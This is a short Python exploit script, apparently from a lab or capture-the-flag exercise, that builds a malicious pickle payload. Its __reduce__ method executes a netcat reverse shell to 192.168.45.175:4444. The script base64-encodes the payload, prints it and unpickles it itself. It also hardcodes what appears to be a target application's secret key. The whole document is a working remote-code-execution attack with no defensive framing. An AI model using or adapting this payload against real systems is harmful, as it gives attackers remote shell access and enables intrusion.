import pickle
import hmac
import base64

SECRET_KEY = b"sz*h2fh58aa65t#efcs5rp6$wb&6!c_n@^(54$-c2yc@8isuzc"

class RCE(object):
    def __reduce__(self):
        return (exec, ("import os;os.system('nc 192.168.45.175 4444 -e /bin/bash')",))

p = pickle.dumps(RCE())

payload = base64.b64encode(p)

print(payload)

pickle.loads(base64.b64decode(payload))
